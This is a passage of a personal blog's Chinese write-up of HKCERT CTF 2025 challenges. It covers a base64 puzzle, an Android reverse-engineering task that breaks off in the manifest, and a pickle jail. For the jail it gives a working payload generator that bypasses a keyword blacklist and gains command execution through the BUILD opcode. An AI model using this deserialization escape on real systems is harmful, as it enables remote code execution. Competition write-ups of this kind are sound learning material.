<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.1">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","social":{"GitHub":"https://github.com/rekjorekjo || fab fa-github"},"padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"github","dark":"github-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>

    <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Rekjo">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hexo</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  






  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js" defer></script>



  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style></head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Hexo</h1>
      <i class="logo-line"></i>
    </a>
      <img class="custom-logo-image" src="/images/headimage.jpg" alt="Hexo">
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Rekjo"
      src="/images/headimage.jpg">
  <p class="site-author-name" itemprop="name">Rekjo</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">5</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/rekjorekjo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;rekjorekjo" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/12/31/HKCERT-CTF2025/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/headimage.jpg">
      <meta itemprop="name" content="Rekjo">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Hexo">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/12/31/HKCERT-CTF2025/" class="post-title-link" itemprop="url">HKCERT_CTF2025</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2025-12-31 21:35:11" itemprop="dateCreated datePublished" datetime="2025-12-31T21:35:11+08:00">2025-12-31</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2026-01-01 23:53:42" itemprop="dateModified" datetime="2026-01-01T23:53:42+08:00">2026-01-01</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="HKCERT-CTF-2025"><a href="#HKCERT-CTF-2025" class="headerlink" title="HKCERT CTF 2025"></a>HKCERT CTF 2025</h2><hr>
<p>[TOC]</p>
<p><img src="/images/image-20260101234410.png" alt=""></p>
<p><img src="/images/image-20251221160129.png" alt=""></p>
<p><code>总排名110/573,位列国际组第71名</code></p>
<p>这是第一次参加国际性质的赛事，也是颇为激动吧，和Rycbartbad师傅、Cha师傅组了一个小队伍</p>
<p>Cha师傅由于时间关系，只做了一点点题目；我和Rycbartbad师傅做到一半被拉去打另一个比赛了</p>
<p>但是很意外的是第一天拿下了一个crypto一血，Cha师傅拿了一个Crypto一血和web三血，还是很有潜力滴~加油加油</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a><strong>misc</strong></h2><ul>
<li>Questionnaire</li>
</ul>
<blockquote>
<p>略</p>
</blockquote>
<ul>
<li>Easy_Base</li>
</ul>
<blockquote>
<p>Newcomer, the academy has given you a set of weapons capable of killing the Dragon King, but the text on them seems a bit hard to read (flag format: flag{xx_xx})</p>
</blockquote>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Zg====AbYQ====wZew====ARZQ====gbaQ====QcdQ====QZdQ====gYaQ====QZcg====QadA====wXcw====QYbg====wZdQ====Qacw====QYZw====AbYQ====AZaQ====wbcg====QZZw====Qacw====Qf</span><br></pre></td></tr></table></figure>
<p>看到字符串挺懵的，首先看到=很像base64/base32，但是base32字符集没这么大，只能是base64</p>
<p>那么多=?姑且当垃圾字节来看，那我们直接解密base64</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">66 00 1b 61 0c 19 7b 00 11 65 08 1b 69 04 1c 75 04 19 75 08 18 69 04 19 72 04 1a 74 0c 17 73 04 18 6e 0c 19 75 04 1a 73 04 18 67 00 1b 61 00 19 69 0c 1b 72 04 19 67 04 1a 73 04 1f</span><br></pre></td></tr></table></figure>
<p>不可见字符全部用hex代替</p>
<p>开头第一个就是f，这很可疑。于是看看“flag”base64之后得到啥？</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l -&gt; bA==</span><br><span class="line">a -&gt; YQ==</span><br><span class="line">g -&gt; Zw==</span><br></pre></td></tr></table></figure>
<p>事已至此，可以发现出题人的小心思了：==垃圾全部删掉，每两个ASCII为一组解码。其中偶数位置需要倒置</p>
<p>ai一把梭，<strong>flag{Deniqueubierit_sanguisagladioregis}</strong></p>
<ul>
<li>easyJail</li>
</ul>
<blockquote>
<p>Very easy pickle jail，go ahead !</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pylint: disable = unnecessary-lambda-assignment, protected-access, redefined-builtin</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">_dispatch = pickle._Unpickler.dispatch</span><br><span class="line"></span><br><span class="line">_noop = <span class="keyword">lambda</span> *_: <span class="literal">None</span></span><br><span class="line">_noop_code = _noop.__code__</span><br><span class="line"></span><br><span class="line">_DISABLED_OPCODES = [</span><br><span class="line">    pickle.NEWOBJ_EX[<span class="number">0</span>],</span><br><span class="line">    pickle.INST[<span class="number">0</span>],</span><br><span class="line">    pickle.REDUCE[<span class="number">0</span>],</span><br><span class="line">    pickle.OBJ[<span class="number">0</span>],</span><br><span class="line">    pickle.NEWOBJ[<span class="number">0</span>],</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> opcode <span class="keyword">in</span> _DISABLED_OPCODES:</span><br><span class="line">    _dispatch.pop(opcode)</span><br><span class="line"></span><br><span class="line">pickle._Unpickler.dispatch = _dispatch</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> method_name <span class="keyword">in</span> (</span><br><span class="line">    <span class="string">&quot;load_newobj_ex&quot;</span>,</span><br><span class="line">    <span class="string">&quot;load_obj&quot;</span>,</span><br><span class="line">    <span class="string">&quot;load_reduce&quot;</span>,</span><br><span class="line">    <span class="string">&quot;load_newobj&quot;</span>,</span><br><span class="line">    <span class="string">&quot;load_inst&quot;</span>,</span><br><span class="line">):</span><br><span class="line">    handler = <span class="built_in">getattr</span>(pickle._Unpickler, method_name)</span><br><span class="line">    handler.__code__ = _noop_code</span><br><span class="line"></span><br><span class="line">__builtins__ = &#123;</span><br><span class="line">    <span class="string">&quot;input&quot;</span>: <span class="built_in">input</span>,</span><br><span class="line">    <span class="string">&quot;ValueError&quot;</span>: ValueError,</span><br><span class="line">    <span class="string">&quot;bytes&quot;</span>: <span class="built_in">bytes</span>,</span><br><span class="line">    <span class="string">&quot;isinstance&quot;</span>: <span class="built_in">isinstance</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> _dispatch</span><br><span class="line"><span class="keyword">del</span> _noop</span><br><span class="line"><span class="keyword">del</span> _noop_code</span><br><span class="line"><span class="keyword">del</span> _DISABLED_OPCODES</span><br><span class="line"><span class="keyword">del</span> opcode</span><br><span class="line"></span><br><span class="line">_BLACKLISTED_SUBSTRINGS = &#123;</span><br><span class="line">    <span class="string">&quot;var&quot;</span>,</span><br><span class="line">    <span class="string">&quot;input&quot;</span>,</span><br><span class="line">    <span class="string">&quot;builtin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;set&quot;</span>,</span><br><span class="line">    <span class="string">&quot;get&quot;</span>,</span><br><span class="line">    <span class="string">&quot;import&quot;</span>,</span><br><span class="line">    <span class="string">&quot;open&quot;</span>,</span><br><span class="line">    <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sys&quot;</span>,</span><br><span class="line">    <span class="string">&quot;eval&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>,</span><br><span class="line">    <span class="string">&quot;compile&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">loads</span>(<span class="params">data: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data, <span class="built_in">bytes</span>):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;expected bytes&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> token <span class="keyword">in</span> _BLACKLISTED_SUBSTRINGS:</span><br><span class="line">        <span class="keyword">if</span> token.encode() <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;<span class="subst">&#123;token&#125;</span> not allowed&quot;</span>)</span><br><span class="line"></span><br><span class="line">    buffer = BytesIO(data)</span><br><span class="line">    <span class="keyword">return</span> pickle._Unpickler(buffer).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">opcode = b64decode(<span class="built_in">input</span>(<span class="string">&quot;Enter your pickle: &quot;</span>).encode())</span><br><span class="line"><span class="keyword">del</span> b64decode</span><br><span class="line">loads(opcode)</span><br></pre></td></tr></table></figure>
<p>if token.encode() in data 检查了黑名单”var”,”input”,”builtin”,”set”,”get”,”import”,”open”,”subprocess”,”sys”,”eval”,”exec”,”os”,”compile”</p>
<p>但是导入了pickle解释器，可以转义绕过</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pickle支持的转义序列</span><br><span class="line">\xhh - 十六进制（如 \x6f = &#x27;o&#x27;）</span><br><span class="line">\ooo - 八进制</span><br><span class="line">\n, \r, \t 等标准转义</span><br><span class="line">\\ - 反斜杠本身</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_DISABLED_OPCODES = [</span><br><span class="line">    pickle.NEWOBJ_EX[<span class="number">0</span>],  <span class="comment"># 禁用创建对象</span></span><br><span class="line">    pickle.INST[<span class="number">0</span>],       <span class="comment"># 禁用实例化</span></span><br><span class="line">    pickle.REDUCE[<span class="number">0</span>],     <span class="comment"># 禁用REDUCE指令 - 非常重要！</span></span><br><span class="line">    pickle.OBJ[<span class="number">0</span>],        <span class="comment"># 禁用OBJ指令</span></span><br><span class="line">    pickle.NEWOBJ[<span class="number">0</span>],     <span class="comment"># 禁用NEWOBJ指令</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>注意到<code>BUILD</code> 指令（操作码 <code>b</code>）没有被禁用</p>
<p>可以导入 os.path。<br>动态地给 os.path 模块添加一个 <strong>setstate</strong> 方法（指向 system 函数）。<br>再次调用 BUILD 传入 cat /flag。<br>pickle 内部逻辑会检测到 <strong>setstate</strong> 存在，调用：os.path.<strong>setstate</strong>(“cat /flag”)。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payload</span>(<span class="params">command</span>):</span><br><span class="line">    <span class="comment"># 将字符串转换为 \uXXXX 格式以绕过黑名单检查</span></span><br><span class="line">    <span class="comment"># 因为 blacklist 检查的是原始字节流，b&#x27;os&#x27; 不在 b&#x27;\\u006f\\u0073&#x27; 中</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">escape</span>(<span class="params">s</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(<span class="string">f&quot;\\u<span class="subst">&#123;<span class="built_in">ord</span>(c):04x&#125;</span>&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># \x80\x04: Protocol 4</span></span><br><span class="line">    <span class="comment"># \x93: STACK_GLOBAL (获取模块/函数)</span></span><br><span class="line">    <span class="comment"># b: BUILD (用于触发执行)</span></span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">b&quot;\x80\x04&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 1. 获取 os.path 模块</span></span><br><span class="line">    payload += <span class="string">b&quot;V&quot;</span> + escape(<span class="string">&quot;os&quot;</span>).encode() + <span class="string">b&quot;\n&quot;</span></span><br><span class="line">    payload += <span class="string">b&quot;V&quot;</span> + escape(<span class="string">&quot;path&quot;</span>).encode() + <span class="string">b&quot;\n&quot;</span></span><br><span class="line">    payload += <span class="string">b&quot;\x93&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 准备字典 &#123; &quot;__setstate__&quot;: posix.system &#125;</span></span><br><span class="line">    payload += <span class="string">b&quot;(&quot;</span></span><br><span class="line">    payload += <span class="string">b&quot;V&quot;</span> + escape(<span class="string">&quot;__setstate__&quot;</span>).encode() + <span class="string">b&quot;\n&quot;</span></span><br><span class="line">    payload += <span class="string">b&quot;V&quot;</span> + escape(<span class="string">&quot;posix&quot;</span>).encode() + <span class="string">b&quot;\n&quot;</span></span><br><span class="line">    payload += <span class="string">b&quot;V&quot;</span> + escape(<span class="string">&quot;system&quot;</span>).encode() + <span class="string">b&quot;\n&quot;</span></span><br><span class="line">    payload += <span class="string">b&quot;\x93&quot;</span></span><br><span class="line">    payload += <span class="string">b&quot;d&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 第一次 BUILD: 将 os.path.__setstate__ 设为 posix.system</span></span><br><span class="line">    payload += <span class="string">b&quot;b&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 4. 第二次 BUILD: 传入命令字符串，触发 os.path.__setstate__(command)</span></span><br><span class="line">    payload += <span class="string">b&quot;V&quot;</span> + command.encode() + <span class="string">b&quot;\n&quot;</span></span><br><span class="line">    payload += <span class="string">b&quot;b&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 5. 结束</span></span><br><span class="line">    payload += <span class="string">b&quot;.&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(payload).decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成读取 flag 的 payload</span></span><br><span class="line">final_b64 = generate_payload(<span class="string">&quot;cat /flag&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Final Payload: <span class="subst">&#123;final_b64&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>攻击payload:gARWXHUwMDZmXHUwMDczClZcdTAwNzBcdTAwNjFcdTAwNzRcdTAwNjgKkyhWXHUwMDVmXHUwMDVmXHUwMDczXHUwMDY1XHUwMDc0XHUwMDczXHUwMDc0XHUwMDYxXHUwMDc0XHUwMDY1XHUwMDVmXHUwMDVmClZcdTAwNzBcdTAwNmZcdTAwNzNcdTAwNjlcdTAwNzgKVlx1MDA3M1x1MDA3OVx1MDA3M1x1MDA3NFx1MDA2NVx1MDA2ZAqTZGJWY2F0IC9mbGFnCmIu</p>
<p><strong>flag{hMbo8rrvlHgS86k3TgXhZGHlGt5WDQSp}</strong></p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a><strong>Reverse</strong></h2><ul>
<li>one_by_one</li>
</ul>
<blockquote>
<p>We need to decrypt it</p>
</blockquote>
<p>发现给了onebypne.apk，第二次挑战apk逆向</p>
<p>jadx打开</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">先认识JADX-GUI的主要区域：</span><br><span class="line"></span><br><span class="line">左侧：文件树，显示包结构</span><br><span class="line"></span><br><span class="line">中间：代码查看区</span><br><span class="line"></span><br><span class="line">右侧：大纲视图（类、方法列表）</span><br><span class="line"></span><br><span class="line">底部：日志/搜索结果</span><br></pre></td></tr></table></figure>
<p>在/res下找到AndroidMainFest.xml</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="line">&lt;manifest xmlns:android=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="line">    android:versionCode=<span class="string">&quot;1&quot;</span></span><br><span class="line">    android:versionName=<span class="string">&quot;1.0&quot;</span></span><br><span class="line">    android:compileSdkVersion=<span class="string">&quot;32&quot;</span></span><br><span class="line">    android:compileSdkVersionCodename=<span class="string">&quot;12&quot;</span></span><br><span class="line">    <span class="keyword">package</span>=<span class="string">&quot;com.example.onebyone&quot;</span></span><br><span class="line">    platformBuildVersionCode=<span class="string">&quot;32&quot;</span></span><br><span class="line">    platformBuildVersionName=<span class="string">&quot;12&quot;</span>&gt;</span><br><span class="line">    &lt;uses-sdk</span><br><span class="line">        android:minSdkVersion=<span class="string">&quot;21&quot;</span></span><br><span class="line">        android:targetSdkVersion=<span class="string">&quot;32&quot;</span>/&gt;</span><br><span class="line">    &lt;application</span><br><span class="line">        android:theme=<span class="string">&quot;@style/Theme.Onebyone&quot;</span></span><br><span class="line">        android:label=<span class="string">&quot;@string/app_name&quot;</span></span><br><span class="line">        android:icon=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span><br><span class="line">        android:debuggable=<span class="string">&quot;true&quot;</span></span><br><span class="line">        android:allowBackup=<span class="string">&quot;true&quot;</span></span><br><span class="line">        android:supportsRtl=<span class="string">&quot;true&quot;</span></span><br><span class="line">        android:fullBackupContent=<span class="string">&quot;@xml/backup_rules&quot;</span></span><br><span class="line">        android:roundIcon=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span></span><br><span class="line">        android:appComponentFactory=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span></span><br><span class="line">        android:dataExtractionRules=<span class="string">&quot;@xml/data_extraction_rules&quot;</span>&gt;</span><br><span class="line">        &lt;activity</span><br><span class="line">            android:name=<span class="string">&quot;com.example.onebyone.MainActivity&quot;</span></span><br><span class="line">            android:exported=<span 